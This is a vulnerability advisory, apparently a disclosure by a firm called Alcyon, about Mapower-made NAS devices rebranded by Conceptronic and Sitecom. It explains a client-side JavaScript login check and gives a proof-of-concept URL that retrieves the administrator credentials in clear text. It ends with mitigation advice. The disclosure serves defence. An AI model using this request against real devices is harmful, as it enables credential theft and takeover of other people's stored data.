 
Severity Rating: High
Discovery Date: May 5, 2012
Vendor Notification: May 31, 2012
 
=Impact
- System Access
- Exposure of sensitive information
 
=Severity Rating
Alcyon rates the severity of this vulnerability as high due to the following properties:
- Ease of exploitation;
- No authentication credentials required;
- No knowledge about individual victims required;
- No interaction with the victim required.
 
=Products and firmware versions affected
-Conceptronic CH3ENAS, firmware version 3.0.8 and below
-Conceptronic CH3HNAS, firmware version 2.4.11 and below
-Sitecom MD-253 and MD254, firmware version 2.4.11 and below
 
Our investigation showed that the mentioned products originate from the Taiwanese manufacturer Mapower. Possibly other rebranded Mapower network storage products are also affected by this flaw.
 
=Risk Assessment
An attacker can harvest administrator credentials and log into the web management UI. Possibilities include but are not limited to reading and writing files stored on the device and altering the device’s configuration.
 
This means an attacker could:
-Steal sensitive data stored on the device;
-Leverage the device to drop and/or host malware;
-Abuse the device to send spam through the victim’s Internet connection;
-Use the device as a pivot point to access locally connected systems or launch attacks directed to other systems.
 
An investigation on our part shows that a multitude of affected devices are directly accessible through the Internet. It appears that this type of NAS-device is popular amongst small businesses. We have seen examples of video production companies and copy shops that utilize this device for  file sharing purposes with their customers.  Other cases of exposure seem to be unintentional. Since some ISP’s assign multiple public IP-addresses to their customers, devices that are connected to the router obtain an Internet-routable IP-address.
 
=Vulnerability
The web management UI validates the user’s login credentials through a JavaScript routine that queries hidden page elements:
 
 function LoginSubmit(){ var data = document.getElementById("Users").value; data = data.split(":");
  
 var UserName = document.getElementById("UserName").value; var UserPasswd = document.getElementById("UserPasswd").value;
  
 if((UserName==data[0])&&(UserPasswd==data[1])){
  document.cookie = "2L:CH3HNAS"
  location.replace (&#039;index.html&#039;);
 } else {
  document.getElementById("UserName").value = &#039;&#039;;
  document.getElementById("UserPasswd").value = &#039;&#039;;
  alert(getWord("login_unauthorized"));
  setTimeout(function(){
    document.getElementById("UserName").focus();},10);
    return false;}
 }
  
 if(document.cookie.indexOf("2L:CH3ENAS") location.replace (&#039;login.htm&#039;);}
  
 
These hidden elements are populated by two different JavaScript functions found in login.js:
 
 function Login(){
  getContent(&#039;&#039;,&#039;/cgi-bin/login.cgi?webmaster&#039;,"function:showLogin");}
  
 function showLogin(msg){
  msg = msg.split("\n");
  window.document.getElementById(&#039;data&#039;).innerHTML = &#039;&#039;;
  setTimeout(function(){document.getElementById("UserName").focus();},10);
 }
  
The getContent function  is responsible for querying a URL and passing the result to the showLogin function.  In this case the result of the web request consists of the username and password of the admin user in clear text form.
 
=Proof of Concept
Paste the following URL into a web browser’s address bar to obtain the administrator’s username and password:
 
 http:///cgi-bin/login.cgi?webmaster&1&Conceptronic2009
 
=Risk Mitigation
 
Unfortunately, for owners of similar, other branded products originating from Mapower, a patched firmware version may be unavailable at this time.
 
We recommend that you limit access to the web management UI of the device by utilizing proper packet filtering and/or NAT on your router in order to limit network access to your NAS. Although this will not completely eliminate the risk of exploitation, it becomes substantially more difficult to leverage a successful attack, because it would involve either a compromise of another host on the victim’s local network or a client side attack that overcomes the Same Origin Policy restrictions of the victim’s web browser.
 
=Vendor responses
 



